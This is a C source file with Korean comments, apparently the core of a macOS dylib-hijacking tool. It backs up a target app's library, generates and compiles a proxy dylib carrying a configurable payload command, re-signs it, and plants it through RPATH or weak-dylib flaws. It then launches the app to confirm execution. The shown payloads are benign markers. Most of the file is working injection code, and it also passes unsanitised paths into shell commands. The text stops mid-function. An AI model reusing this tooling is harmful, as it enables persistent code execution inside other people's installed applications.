/**
 * main_corrected.c
 * 
 * macOS Dylib 주입 로더 - 올바른 통합 버전
 * 
 * 흐름:
 * 1. Report 파싱
 * 2. 사용자가 처리할 바이너리 선택
 * 3. handle_target(선택된 바이너리) 호출
 * 4. handle_target 내에서:
 *    a) Type 자동 판정
 *    b) 다중 Type 분석
 *    c) 사용자가 어떤 Type을 검증할지 선택
 *    d) 선택한 Type의 검증 함수 호출
 * 5. 메트릭 기록
 */

#include "result_parser.h"
#include "framework_analyzer.h"
#include "multi_rpath_resolver.h"
#include "rpath_injector.h"
#include "weak_dylib_injector.h"
#include "dylib_modifier.h"
#include "dependency_chain.h"
#include "framework_injector.h"
#include "modular_injector.h"
#include "framework_supply_chain.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/stat.h>
#include <time.h>

#define SCANNER_OUTPUT_PATH "payload/report.txt"
#define MY_DYLIB_TEMPLATE_PATH "payload/template.c"
#define PAYLOAD_SUCCESS_HTML "payload/success.html"
#define PAYLOAD_COMMAND_DEFAULT "open -a Calculator"  // 기본값

/* ================================================================
 * Type 정의 및 도우미 함수들 (기존 유지)
 * ================================================================ */

// Forward declaration
static int get_user_choice(const char *prompt, int min, int max);

/**
 * payload/success.html 파일 생성
 * @return 성공 시 true
 */
static bool generate_success_html(void) {
    FILE *fp = fopen(PAYLOAD_SUCCESS_HTML, "w");
    if (!fp) {
        fprintf(stderr, "[ERROR] success.html을 쓸 수 없음: %s\n", PAYLOAD_SUCCESS_HTML);
        return false;
    }
    
    const char *html_content = "<!DOCTYPE html>\n"
        "<html lang=\"ko\">\n"
        "<head>\n"
        "    <meta charset=\"UTF-8\">\n"
        "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n"
        "    <title>Dylib 주입 성공</title>\n"
        "    <style>\n"
        "        * { margin: 0; padding: 0; box-sizing: border-box; }\n"
        "        body {\n"
        "            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;\n"
        "            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n"
        "            min-height: 100vh;\n"
        "            display: flex;\n"
        "            align-items: center;\n"
        "            justify-content: center;\n"
        "        }\n"
        "        .container {\n"
        "            background: white;\n"
        "            border-radius: 20px;\n"
        "            box-shadow: 0 20px 60px rgba(0,0,0,0.3);\n"
        "            padding: 60px 40px;\n"
        "            text-align: center;\n"
        "            max-width: 600px;\n"
        "            animation: slideUp 0.6s ease-out;\n"
        "        }\n"
        "        @keyframes slideUp {\n"
        "            from { opacity: 0; transform: translateY(30px); }\n"
        "            to { opacity: 1; transform: translateY(0); }\n"
        "        }\n"
        "        .checkmark {\n"
        "            width: 80px;\n"
        "            height: 80px;\n"
        "            border-radius: 50%;\n"
        "            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n"
        "            margin: 0 auto 30px;\n"
        "            display: flex;\n"
        "            align-items: center;\n"
        "            justify-content: center;\n"
        "            animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);\n"
        "        }\n"
        "        @keyframes popIn {\n"
        "            0% { transform: scale(0); }\n"
        "            100% { transform: scale(1); }\n"
        "        }\n"
        "        .checkmark svg {\n"
        "            width: 50px;\n"
        "            height: 50px;\n"
        "            stroke: white;\n"
        "            stroke-width: 3;\n"
        "            fill: none;\n"
        "            stroke-linecap: round;\n"
        "            animation: checkAnimation 0.8s ease-out 0.4s backwards;\n"
        "        }\n"
        "        @keyframes checkAnimation {\n"
        "            0% {\n"
        "                stroke-dasharray: 50;\n"
        "                stroke-dashoffset: 50;\n"
        "            }\n"
        "            100% {\n"
        "                stroke-dasharray: 50;\n"
        "                stroke-dashoffset: 0;\n"
        "            }\n"
        "        }\n"
        "        h1 {\n"
        "            color: #333;\n"
        "            font-size: 2.5em;\n"
        "            margin-bottom: 15px;\n"
        "            font-weight: 700;\n"
        "        }\n"
        "        .subtitle {\n"
        "            color: #666;\n"
        "            font-size: 1.1em;\n"
        "            margin-bottom: 30px;\n"
        "            line-height: 1.6;\n"
        "        }\n"
        "        .details {\n"
        "            background: #f5f5f5;\n"
        "            border-radius: 10px;\n"
        "            padding: 20px;\n"
        "            margin: 30px 0;\n"
        "            text-align: left;\n"
        "            font-size: 0.95em;\n"
        "        }\n"
        "        .details p {\n"
        "            margin: 10px 0;\n"
        "            color: #555;\n"
        "        }\n"
        "        .label {\n"
        "            color: #667eea;\n"
        "            font-weight: 600;\n"
        "        }\n"
        "        .status {\n"
        "            color: #22c55e;\n"
        "            font-weight: 600;\n"
        "        }\n"
        "        .warning {\n"
        "            background: #fef3c7;\n"
        "            border-left: 4px solid #f59e0b;\n"
        "            padding: 15px;\n"
        "            border-radius: 5px;\n"
        "            margin-top: 20px;\n"
        "            text-align: left;\n"
        "            color: #92400e;\n"
        "            font-size: 0.9em;\n"
        "        }\n"
        "    </style>\n"
        "</head>\n"
        "<body>\n"
        "    <div class=\"container\">\n"
        "        <div class=\"checkmark\">\n"
        "            <svg viewBox=\"0 0 24 24\">\n"
        "                <polyline points=\"20 6 9 17 4 12\"></polyline>\n"
        "            </svg>\n"
        "        </div>\n"
        "        <h1>✓ Dylib 주입 성공</h1>\n"
        "        <div class=\"subtitle\">\n"
        "            <p>악의적인 dylib이 대상 프로세스에 성공적으로 주입되었습니다.</p>\n"
        "        </div>\n"
        "        <div class=\"details\">\n"
        "            <p><span class=\"label\">✓ 상태:</span> <span class=\"status\">주입 완료</span></p>\n"
        "            <p><span class=\"label\">📍 위치:</span> ./payload/</p>\n"
        "            <p><span class=\"label\">🔧 다음 단계:</span> 대상 애플리케이션을 실행하면 주입된 dylib이 로드됩니다.</p>\n"
        "        </div>\n"
        "        <div class=\"warning\">\n"
        "            <strong>⚠️ 주의:</strong> 이 기술은 교육 및 보안 연구 목적으로만 사용해야 합니다.\n"
        "        </div>\n"
        "    </div>\n"
        "</body>\n"
        "</html>\n";
    
    fputs(html_content, fp);
    fclose(fp);
    return true;
}

typedef enum {
    TYPE_A_SIMPLE,      // 독립형 외부 라이브러리
    TYPE_B_FRAMEWORK,   // 서드파티 Framework
    TYPE_C_MODULAR,     // 내부 모듈화 Framework 체인
    TYPE_UNKNOWN
} VulnType;

typedef struct {
    bool has_type_a;
    bool has_type_b;
    bool has_type_c;
    VulnType primary_type;
    
    size_t type_a_count;
    size_t type_b_count;
    size_t type_c_depth;
} MultiTypeInfo;

/**
 * 원본 dylib을 /tmp에 복사
 * 
 * @param absolute_dylib_path Scanner에서 제공한 절대 경로
 * @param dylib_name dylib의 파일명 (예: libnss3.dylib)
 * @return 성공 시 /tmp에 복사된 경로 (동적 할당)
 */
static char* backup_original_dylib(const char *absolute_dylib_path, const char *dylib_name) {
    printf("\n[*] 원본 dylib /tmp에 백업\n");
    printf("   대상 dylib: %s\n", dylib_name);
    printf("   절대 경로: %s\n", absolute_dylib_path);
    
    // 파일 존재 확인
    printf("   [*] 파일 존재 확인 중...\n");
    
    char check_cmd[1024];
    snprintf(check_cmd, sizeof(check_cmd), "[ -f '%s' ] && echo 'exists' || echo 'not_found'", 
             absolute_dylib_path);
    
    FILE *fp = popen(check_cmd, "r");
    if (!fp) {
        fprintf(stderr, "[ERROR] 파일 확인 명령 실행 실패\n");
        return NULL;
    }
    
    char result[32];
    if (!fgets(result, sizeof(result), fp)) {
        pclose(fp);
        fprintf(stderr, "[ERROR] 파일 확인 결과를 읽을 수 없음\n");
        return NULL;
    }
    pclose(fp);
    
    // 결과 확인 (개행 제거)
    size_t len = strlen(result);
    if (len > 0 && result[len-1] == '\n') {
        result[len-1] = '\0';
    }
    
    if (strcmp(result, "exists") != 0) {
        fprintf(stderr, "[ERROR] dylib을 찾을 수 없음: %s\n", absolute_dylib_path);
        fprintf(stderr, "[HINT] Scanner 결과의 절대 경로가 올바른지 확인하세요\n");
        return NULL;
    }
    
    printf("   [✓] 파일 발견\n");
    
    // /tmp에 복사
    char tmp_path[1024];
    snprintf(tmp_path, sizeof(tmp_path), "/tmp/%s", dylib_name);
    
    char copy_cmd[2048];
    snprintf(copy_cmd, sizeof(copy_cmd), "cp -f '%s' '%s' 2>&1", 
             absolute_dylib_path, tmp_path);
    
    printf("   [*] 복사: %s → %s\n", absolute_dylib_path, tmp_path);
    printf("   [*] 명령 실행 중...\n");
    
    int ret = system(copy_cmd);
    if (ret != 0) {
        fprintf(stderr, "[ERROR] dylib 복사 실패 (반환값: %d)\n", ret);
        return NULL;
    }
    
    // 복사 확인
    printf("   [✓] 백업 완료: %s\n", tmp_path);
    
    // 백업 dylib의 install_name 변경 (중요!)
    // 원본: @executable_path/../Frameworks/libportaudio.dylib
    // 변경: /tmp/libportaudio.dylib (실제 파일)로 변경하되, install_name은 /tmp의 경로로 유지
    // 이렇게 하면 우리 dylib이 이 파일을 의존할 때 순환 참조가 되지 않음
    printf("\n   [*] 백업 dylib의 install_name 변경\n");
    
    // /tmp/libportaudio.dylib의 install_name을 그대로 /tmp/libportaudio.dylib로 만들기
    char install_name_cmd[1024];
    snprintf(install_name_cmd, sizeof(install_name_cmd),
             "install_name_tool -id '%s' '%s' 2>&1", tmp_path, tmp_path);
    
    printf("   [*] 명령: %s\n", install_name_cmd);
    int ret2 = system(install_name_cmd);
    
    if (ret2 == 0) {
        printf("   [✓] install_name 변경 완료\n");
    } else {
        printf("   [WARNING] install_name 변경 실패 (반환값: %d)\n", ret2);
    }
    
    // 코드 서명 재설정
    printf("   [*] 코드 서명 재설정\n");
    char codesign_cmd[1024];
    snprintf(codesign_cmd, sizeof(codesign_cmd), "codesign -f -s - '%s' 2>&1", tmp_path);
    
    int ret3 = system(codesign_cmd);
    if (ret3 == 0) {
        printf("   [✓] 코드 서명 완료\n");
    } else {
        printf("   [WARNING] 코드 서명 실패\n");
    }
    
    // 파일 정보 확인
    char file_cmd[1024];
    snprintf(file_cmd, sizeof(file_cmd), "ls -lh '%s' && otool -L '%s' | head -3", tmp_path, tmp_path);
    printf("   [*] 백업 dylib 정보:\n");
    system(file_cmd);
    
    return strdup(tmp_path);
}

/**
 * 사용자 입력으로 Payload 명령 선택
 */

/**
 * 템플릿 파일을 읽고 변수들을 치환하여 dylib.c 생성
 * 
 * @param template_path 템플릿 파일 경로
 * @param dylib_name 대체할 dylib 이름 (예: libnss3.dylib)
 * @param original_dylib_backup_path /tmp에 백업된 원본 dylib 경로
 * @param payload_cmd payload 명령
 * @param output_path 생성될 dylib.c 파일 경로
 * @return 성공 시 true
 */
static bool generate_dylib_source(const char *template_path, 
                                  const char *dylib_name,
                                  const char *original_dylib_backup_path,
                                  const char *payload_cmd,
                                  const char *output_path) {
    printf("\n[*] dylib.c 소스 생성\n");
    printf("   템플릿: %s\n", template_path);
    printf("   출력 경로: %s\n", output_path);
    printf("   대체 dylib: %s\n", dylib_name);
    printf("   백업 경로: %s\n", original_dylib_backup_path);
    printf("   Payload: %s\n", payload_cmd);
    
    // 템플릿 파일 읽기
    FILE *template_fp = fopen(template_path, "r");
    if (!template_fp) {
        fprintf(stderr, "[ERROR] 템플릿 파일을 열 수 없음: %s\n", template_path);
        return false;
    }
    
    // 템플릿 전체 읽기
    char template_content[65536] = {0};
    size_t total_read = 0;
    int ch;
    while ((ch = fgetc(template_fp)) != EOF && total_read < sizeof(template_content) - 1) {
        template_content[total_read++] = ch;
    }
    template_content[total_read] = '\0';
    fclose(template_fp);
    
    if (total_read == 0) {
        fprintf(stderr, "[ERROR] 템플릿 파일이 비어있음\n");
        return false;
    }
    
    // 변수 치환
    char replaced_content[65536] = {0};
    const char *src = template_content;
    char *dst = replaced_content;
    size_t dst_remaining = sizeof(replaced_content) - 1;
    
    while (*src && dst_remaining > 0) {
        // {{DYLIB_NAME}} 찾기
        if (strstr(src, "{{DYLIB_NAME}}") == src) {
            size_t dylib_len = strlen(dylib_name);
            if (dylib_len > dst_remaining) {
                fprintf(stderr, "[ERROR] 출력 버퍼 부족\n");
                return false;
            }
            strcpy(dst, dylib_name);
            dst += dylib_len;
            dst_remaining -= dylib_len;
            src += strlen("{{DYLIB_NAME}}");
        }
        // {{ORIGINAL_DYLIB_BACKUP_PATH}} 찾기
        else if (strstr(src, "{{ORIGINAL_DYLIB_BACKUP_PATH}}") == src) {
            size_t path_len = strlen(original_dylib_backup_path);
            if (path_len > dst_remaining) {
                fprintf(stderr, "[ERROR] 출력 버퍼 부족\n");
                return false;
            }
            strcpy(dst, original_dylib_backup_path);
            dst += path_len;
            dst_remaining -= path_len;
            src += strlen("{{ORIGINAL_DYLIB_BACKUP_PATH}}");
        }
        // {{PAYLOAD_COMMAND}} 찾기
        else if (strstr(src, "{{PAYLOAD_COMMAND}}") == src) {
            size_t cmd_len = strlen(payload_cmd);
            if (cmd_len > dst_remaining) {
                fprintf(stderr, "[ERROR] 출력 버퍼 부족\n");
                return false;
            }
            strcpy(dst, payload_cmd);
            dst += cmd_len;
            dst_remaining -= cmd_len;
            src += strlen("{{PAYLOAD_COMMAND}}");
        }
        // 일반 문자
        else {
            *dst++ = *src++;
            dst_remaining--;
        }
    }
    
    *dst = '\0';
    
    // 생성된 파일 쓰기
    FILE *output_fp = fopen(output_path, "w");
    if (!output_fp) {
        fprintf(stderr, "[ERROR] 출력 파일을 쓸 수 없음: %s\n", output_path);
        return false;
    }
    
    fputs(replaced_content, output_fp);
    fclose(output_fp);
    
    printf("[✓] dylib.c 생성 완료\n");
    return true;
}

/**
 * dylib.c를 컴파일하여 dylib 생성
 * 
 * @param source_path dylib.c 파일 경로
 * @param output_dylib_path 생성될 dylib 파일 경로
 * @param original_dylib_backup_path 원본 dylib의 백업 경로 (심볼 재내보내기용)
 * @param install_name_path dylib의 설치 위치 (예: @executable_path/../Frameworks/libportaudio.dylib)
 *                          NULL이면 @executable_path/../Frameworks/{dylib_filename} 사용
 * @return 성공 시 true
 */
static bool compile_dylib_source(const char *source_path, const char *output_dylib_path, 
                                 const char *original_dylib_backup_path,
                                 const char *install_name_path) {
    printf("\n[*] dylib 컴파일\n");
    printf("   소스: %s\n", source_path);
    printf("   출력: %s\n", output_dylib_path);
    printf("   원본 dylib (링크): %s\n", original_dylib_backup_path);
    printf("   install_name: %s\n", install_name_path ? install_name_path : "(기본값)");
    
    // 백업 파일명 추출 (/tmp/libportaudio.dylib → libportaudio.dylib)
    char *dylib_filename = strrchr(original_dylib_backup_path, '/');
    if (!dylib_filename) {
        dylib_filename = (char *)original_dylib_backup_path;
    } else {
        dylib_filename++;  // '/' 다음부터 시작
    }
    
    // install_name 결정
    char final_install_name[1024];
    if (install_name_path) {
        // Scanner에서 제공한 경로 사용 (예: @executable_path/../Frameworks/libportaudio.dylib)
        strncpy(final_install_name, install_name_path, sizeof(final_install_name) - 1);
        final_install_name[sizeof(final_install_name) - 1] = '\0';
        printf("[*] 지정된 install_name 사용: %s\n", final_install_name);
    } else {
        // 기본값: @executable_path/../Frameworks/{dylib_filename}
        snprintf(final_install_name, sizeof(final_install_name),
                 "@executable_path/../Frameworks/%s", dylib_filename);
        printf("[*] 기본 install_name 사용: %s\n", final_install_name);
    }
    
    // clang 컴파일 명령
    // -fPIC: Position Independent Code
    // -dynamiclib: dylib 생성
    // -undefined dynamic_lookup: 외부 심볼 동적 해석
    // 
    // 핵심 전략:
    // 1. 먼저 다른 install_name(my_libportaudio_temp.dylib)으로 빌드
    //    → 백업 dylib을 링크할 수 있음 (install_name이 다르므로)
    // 2. 빌드 후 install_name_tool로 원본과 같게 변경
    //    → DYLD가 원본 위치에서 우리 dylib 발견
    //    → 백업 dylib의 심볼 모두 제공 ✅
    char temp_install_name[256];
    snprintf(temp_install_name, sizeof(temp_install_name), "my_%s_temp", dylib_filename);
    
    char compile_cmd[2048];
    snprintf(compile_cmd, sizeof(compile_cmd),
             "clang -fPIC -dynamiclib -undefined dynamic_lookup -framework Foundation "
             "-Wl,-install_name,%s "
             "-Wl,-reexport_library,%s "
             "'%s' -o '%s' 2>&1",
             temp_install_name, original_dylib_backup_path, source_path, output_dylib_path);
    
    printf("   [*] 명령: %s\n", compile_cmd);
    printf("   [*] 컴파일 중...\n");
    
    int ret = system(compile_cmd);
    
    if (ret == 0) {
        printf("[✓] 컴파일 완료\n");
        
        // install_name 변경: dylib 자체의 install_name을 지정된 경로로 설정
        // -id: dylib 자체의 install_name 변경 (이게 핵심!)
        printf("\n[*] dylib install_name 변경\n");
        char install_name_tool_cmd[2048];
        snprintf(install_name_tool_cmd, sizeof(install_name_tool_cmd),
                 "install_name_tool -id '%s' '%s' 2>&1",
                 final_install_name, output_dylib_path);
        
        printf("   [*] 명령: %s\n", install_name_tool_cmd);
        int ret2 = system(install_name_tool_cmd);
        
        if (ret2 == 0) {
            printf("[✓] install_name 변경 완료\n");
        } else {
            printf("[WARNING] install_name 변경 실패 (반환값: %d)\n", ret2);
        }
        
        // install_name_tool이 코드 서명을 깰 수 있으므로 다시 서명
        printf("\n[*] 코드 서명\n");
        char codesign_cmd[1024];
        snprintf(codesign_cmd, sizeof(codesign_cmd),
                 "codesign -f -s - '%s' 2>&1", output_dylib_path);
        
        printf("   [*] 명령: %s\n", codesign_cmd);
        int ret3 = system(codesign_cmd);
        
        if (ret3 == 0) {
            printf("[✓] 코드 서명 완료\n");
        } else {
            printf("[WARNING] 코드 서명 실패 (반환값: %d)\n", ret3);
        }
        
        // (순환 참조 방지 - 우리 dylib이 자신의 원래 위치를 의존하면 DYLD가 무한 루프)
        printf("\n[*] 순환 참조 방지: 불필요한 의존성 제거\n");
        char remove_dep_cmd[2048];
        // final_install_name에서 dylib 파일명만 추출해서 변경
        // 예: @executable_path/../Frameworks/libportaudio.dylib → /tmp/libportaudio.dylib
        snprintf(remove_dep_cmd, sizeof(remove_dep_cmd),
                 "install_name_tool -change '%s' '/tmp/%s' '%s' 2>&1",
                 final_install_name, dylib_filename, output_dylib_path);
        
        printf("   [*] 명령: %s\n", remove_dep_cmd);
        int ret4 = system(remove_dep_cmd);
        
        if (ret4 == 0) {
            printf("   [✓] 의존성 제거 완료\n");
        } else {
            printf("   [!] 의존성이 없거나 변경 실패 (반환값: %d)\n", ret4);
        }
        
        // 최종 codesign
        printf("\n[*] 최종 코드 서명\n");
        snprintf(codesign_cmd, sizeof(codesign_cmd), "codesign -f -s - '%s' 2>&1", output_dylib_path);
        int ret5 = system(codesign_cmd);
        if (ret5 == 0) {
            printf("[✓] 최종 서명 완료\n");
        } else {
            printf("[WARNING] 최종 서명 실패\n");
        }
        
        // 생성된 dylib 확인
        char verify_cmd[1024];
        snprintf(verify_cmd, sizeof(verify_cmd), "file '%s' && otool -L '%s' | head -8", output_dylib_path, output_dylib_path);
        printf("\n[*] 생성된 dylib 확인:\n");
        system(verify_cmd);
        
        return true;
    } else {
        fprintf(stderr, "[ERROR] 컴파일 실패 (반환값: %d)\n", ret);
        return false;
    }
}


static size_t count_frameworks_in_paths(char **paths, size_t count) {
    if (!paths || count == 0) return 0;
    
    size_t framework_count = 0;
    for (size_t i = 0; i < count; i++) {
        if (strstr(paths[i], ".framework") != NULL) {
            framework_count++;
        }
    }
    return framework_count;
}

static MultiTypeInfo analyze_multi_types(VulnerableTarget *target, size_t fw_count) {
    MultiTypeInfo info = {0};
    
    if (!target) return info;
    
    // Type A 체크: 독립형 dylib 요소
    size_t pure_dylib_count = 0;
    for (size_t i = 0; i < target->rpath_count; i++) {
        if (strstr(target->rpath_vulns[i], ".framework") == NULL) {
            pure_dylib_count++;
        }
    }
    
    if (pure_dylib_count > 0) {
        info.has_type_a = true;
        info.type_a_count = pure_dylib_count;
    }
    
    // Type B 체크: Framework 번들
    if (fw_count >= 1 && fw_count <= 3) {
        info.has_type_b = true;
        info.type_b_count = fw_count;
    }
    
    // Type C 체크: 복잡한 모듈화 구조
    if (fw_count >= 4 || target->rpath_count >= 8) {
        info.has_type_c = true;
        info.type_c_depth = target->rpath_count;
    }
    
    // 주요 Type 결정
    if (info.has_type_c) {
        info.primary_type = TYPE_C_MODULAR;
    } else if (info.has_type_b) {
        info.primary_type = TYPE_B_FRAMEWORK;
    } else if (info.has_type_a) {
        info.primary_type = TYPE_A_SIMPLE;
    } else {
        info.primary_type = TYPE_UNKNOWN;
    }
    
    return info;
}

/**
 * 경로에서 Framework 이름 추출 (중복 제거)
 */
static char** extract_framework_names(char **paths, size_t count, size_t *out_unique_count) {
    if (!paths || count == 0) {
        if (out_unique_count) *out_unique_count = 0;
        return NULL;
    }
    
    char **frameworks = calloc(count, sizeof(char *));
    size_t fw_count = 0;
    
    for (size_t i = 0; i < count; i++) {
        const char *fw_start = strstr(paths[i], ".framework");
        if (fw_start) {
            // .framework까지의 전체 경로에서 마지막 / 찾기
            const char *fw_end = strchr(fw_start, '/');
            if (!fw_end) fw_end = strchr(fw_start, '\0');
            
            char fw_path[512];
            size_t len = fw_end - paths[i];
            if (len < sizeof(fw_path)) {
                strncpy(fw_path, paths[i], len);
                fw_path[len] = '\0';
                
                // 중복 제거
                bool already_exists = false;
                for (size_t j = 0; j < fw_count; j++) {
                    if (strcmp(frameworks[j], fw_path) == 0) {
                        already_exists = true;
                        break;
                    }
                }
                
                if (!already_exists && fw_count < count) {
                    frameworks[fw_count++] = strdup(fw_path);
                }
            }
        }
    }
    
    if (out_unique_count) *out_unique_count = fw_count;
    return frameworks;
}

/**
 * 바이너리 경로에서 앱 번들 경로 추출
 * 예: /Applications/Stats.app/Contents/MacOS/Stats
 *   → /Applications/Stats.app
 */
static char* extract_app_bundle_path(const char *binary_path) {
    if (!binary_path) return NULL;
    
    // ".app" 찾기
    const char *app_end = strstr(binary_path, ".app");
    if (!app_end) return NULL;
    
    // ".app" 다음의 첫 번째 '/' 찾기 (또는 끝)
    app_end += 4;  // ".app" 길이
    
    // 앞에서부터 ".app"까지 복사
    char *result = malloc(app_end - binary_path + 1);
    strncpy(result, binary_path, app_end - binary_path);
    result[app_end - binary_path] = '\0';
    
    return result;
}

/**
 * dylib 이름 추출 (경로에서)
 * 예: /path/to/libswiftCore.dylib → libswiftCore.dylib
 */
static char* extract_dylib_name(const char *dylib_path) {
    const char *last_slash = strrchr(dylib_path, '/');
    if (last_slash) {
        return strdup(last_slash + 1);
    }
    return strdup(dylib_path);
}

static int get_user_choice(const char *prompt, int min, int max) {
    printf("%s (%d-%d): ", prompt, min, max);
    fflush(stdout);
    
    char input[256];
    if (!fgets(input, sizeof(input), stdin)) return min;
    
    int choice = atoi(input);
    if (choice < min || choice > max) {
        printf("[!] 유효하지 않은 선택. 기본값(%d) 사용\n", min);
        return min;
    }
    
    return choice;
}

/* ================================================================
 * Forward Declarations
 * ================================================================ */


/* ================================================================
 * Type별 처리 함수
 * ================================================================ */

/**
 * Type A 처리: 기존 로직 (단순 dylib 주입)
 */
static bool handle_type_a(VulnerableTarget *target) {
    printf("\n╔════════════════════════════════════════════════════════════╗\n");
    printf("║              Type A: 독립형 외부 라이브러리                ║\n");
    printf("╚════════════════════════════════════════════════════════════╝\n");
    
    printf("\n[*] Type A 특성\n");
    printf("    - 독립형 dylib\n");
    printf("    - RPATH 기반 로딩\n");
    printf("    - 검증 시간: ~2분\n");
    
    printf("\n[*] 취약 경로 목록:\n");
    size_t pure_dylib_index = 0;
    for (size_t i = 0; i < target->rpath_count; i++) {
        if (strstr(target->rpath_vulns[i], ".framework") == NULL) {
            printf("    [%zu] %s\n", pure_dylib_index + 1, target->rpath_vulns[i]);
            pure_dylib_index++;
        }
    }
    // for (size_t i = 0; i < target->rpath_count; i++) {
    //     printf("    [%zu] %s\n", i + 1, target->rpath_vulns[i]);
    // }
    
    // 주입할 dylib 선택
    printf("\n[*] 주입할 dylib 선택 (1-%zu, 또는 0 취소): ", pure_dylib_index);
    
    char input[256];
    if (!fgets(input, sizeof(input), stdin)) return false;
    
    int choice = atoi(input);
    if (choice < 1 || choice > (int)target->rpath_count) {
        printf("[✗] 유효하지 않은 선택\n");
        return false;
    }
    
    const char *selected_dylib = target->rpath_vulns[choice - 1];
    printf("\n[✓] 선택: %s\n", selected_dylib);
    
    // 기존 rpath_injector 사용
    printf("\n[*] Type A 주입 수행 중...\n");
    
    char *dylib_name = extract_dylib_name(selected_dylib);
    
    printf("\n[✓] 선택: %s\n", dylib_name);
    printf("   절대 경로: %s\n", selected_dylib);
    
    // 1단계: 원본 dylib을 /tmp에 백업 - 절대경로를 직접 전달
    char *tmp_backup_path = backup_original_dylib(selected_dylib, dylib_name);
    if (!tmp_backup_path) {
        fprintf(stderr, "[ERROR] 원본 dylib 백업 실패\n");
        free(dylib_name);
        return false;
    }
    
    // 선택된 dylib의 install_name 결정
    // Scanner에서 제공한 경로를 분석하여 적절한 install_name 생성
    char computed_install_name[1024] = {0};
    
    // 만약 절대 경로라면, @executable_path나 @loader_path로 변환 시도
    // 예: /Applications/.../Frameworks/libswiftCore.dylib 
    //     → @executable_path/../Frameworks/libswiftCore.dylib
    if (selected_dylib[0] == '/') {
        // 절대 경로인 경우
        const char *frameworks_pos = strstr(selected_dylib, "Frameworks/");
        if (frameworks_pos) {
            // Frameworks/libXXX.dylib 형식으로 변환
            snprintf(computed_install_name, sizeof(computed_install_name),
                     "@executable_path/../Frameworks/%s", dylib_name);
        } else {
            // 다른 위치면 파일명만 사용
            snprintf(computed_install_name, sizeof(computed_install_name),
                     "@executable_path/../lib/%s", dylib_name);
        }
    } else {
        // 상대 경로인 경우 (예: @rpath/../Frameworks/libXXX.dylib)
        // 그대로 사용 가능
        strncpy(computed_install_name, selected_dylib, sizeof(computed_install_name) - 1);
    }
    printf("   computed install_name: %s\n", computed_install_name);
    
    // 2단계: Payload 명령 생성 (마커 + 로그 방식)
    char success_marker[256];
    char attack_log[256];
    snprintf(success_marker, sizeof(success_marker), "/tmp/type_a_%s_success", dylib_name);
    snprintf(attack_log, sizeof(attack_log), "/tmp/type_a_%s_attack.log", dylib_name);

    char payload_cmd[512];
    snprintf(payload_cmd, sizeof(payload_cmd), "touch %s", success_marker);

    // 3단계: 템플릿에서 dylib.c 생성
    char generated_source[256];
    snprintf(generated_source, sizeof(generated_source), "/tmp/my_dylib_%s.c", dylib_name);

    if (!generate_dylib_source(MY_DYLIB_TEMPLATE_PATH, dylib_name, tmp_backup_path,
                              payload_cmd, generated_source)) {
        fprintf(stderr, "[ERROR] dylib.c 생성 실패\n");
        free(dylib_name);
        free(tmp_backup_path);
        return false;
    }

    /* 로그 작성 기능 추가 (생성 후에) */
    FILE *src_file = fopen(generated_source, "a");
    if (src_file) {
        fprintf(src_file, "\nvoid log_type_a_attack(void) __attribute__((constructor));\n");
        fprintf(src_file, "void log_type_a_attack(void) {\n");
        fprintf(src_file, "    FILE *log = fopen(\"%s\", \"a\");\n", attack_log);
        fprintf(src_file, "    if (log) {\n");
        fprintf(src_file, "        fprintf(log, \"[Standalone dylib Attack Success]\\n\");\n");
        fprintf(src_file, "        fprintf(log, \"Dylib: %s\\n\");\n", dylib_name);
        fprintf(src_file, "        fprintf(log, \"PID: %%d\\n\", getpid());\n");
        fprintf(src_file, "        fclose(log);\n");
        fprintf(src_file, "    }\n");
        fprintf(src_file, "}\n");
        fclose(src_file);
    }
    
    // 4단계: dylib.c 컴파일 (원본 dylib 경로와 install_name 전달)
    char compiled_dylib[256];
    snprintf(compiled_dylib, sizeof(compiled_dylib), "/tmp/my_dylib_%s.dylib", dylib_name);
    
    if (!compile_dylib_source(generated_source, compiled_dylib, tmp_backup_path, computed_install_name)) {
        fprintf(stderr, "[ERROR] dylib 컴파일 실패\n");
        free(dylib_name);
        free(tmp_backup_path);
        return false;
    }
    
    // 5단계: 사용자에게 주입 방식 확인
    printf("\n[*] 주입 방식 선택\n");
    
    bool use_rpath = (target->vuln_type == VULN_RPATH) ? true : false;
    bool use_weak = (target->vuln_type == VULN_WEAK_DYLIB) ? true : false;
    
    if (target->vuln_type == VULN_BOTH) {
        printf("   [1] RPATH 취약점을 통한 주입\n");
        printf("   [2] Weak Dylib을 통한 주입\n\n");
        
        int method_choice = get_user_choice("주입 방식 선택", 1, 2);
        use_rpath = (method_choice == 1);
        use_weak = (method_choice == 2);
    }

    // 6단계: 선택된 방식으로 주입
    if (use_rpath) {
        printf("\n[*] RPATH 주입 수행\n");
        inject_via_rpath(
            compiled_dylib,
            target->binary_path,
            target->rpath_vulns,
            target->rpath_count,
            dylib_name,
            choice - 1  // 0부터 시작하는 인덱스
        );
    } else if (use_weak) {
        printf("\n[*] Weak Dylib 주입 수행\n");
        inject_via_weak_dylib(
            compiled_dylib,
            target->binary_path,
            target->weak_dylib_vulns,
            target->weak_dylib_count,
            dylib_name
        );
    }
    
    /* 7단계: 검증 (마커 기반) */
    printf("\n[*] Type A 공격 검증 중...\n");

    /* 앱 실행 및 로그 수집 */
    char app_cmd[1024];
    char app_output[256];
    snprintf(app_output, sizeof(app_output), "/tmp/sa_dylib_%s.log", dylib_name);
    snprintf(app_cmd, sizeof(app_cmd), "\"%s\" > %s 2>&1 &", target->binary_path, app_output);

    system(app_cmd);
    sleep(2);

    /* 프로세스 종료 */
    snprintf(app_cmd, sizeof(app_cmd), "pkill -f \"%s\" 2>/dev/null || true", target->binary_path);
    system(app_cmd);
    sleep(1);

    /* 마커 파일 확인 */
    bool verification_success = (access(success_marker, F_OK) == 0);

    if (verification_success) {
        printf("  [✓] 악성 dylib 실행 확인!\n");
        printf("  [✓] Type A 공격 성공!\n");
    } else {
        printf("  [✗] 공격 검증 실패\n");
    }

    /* 8단계: 원본 dylib 복구 */
    printf("\n[*] 원본 dylib 복구 중...\n");
    char restore_cmd[1024];
    snprintf(restore_cmd, sizeof(restore_cmd), "cp \"%s\" \"%s\" 2>&1", tmp_backup_path, selected_dylib);

    if (system(restore_cmd) == 0) {
        printf("  [✓] 복구 완료\n");
    } else {
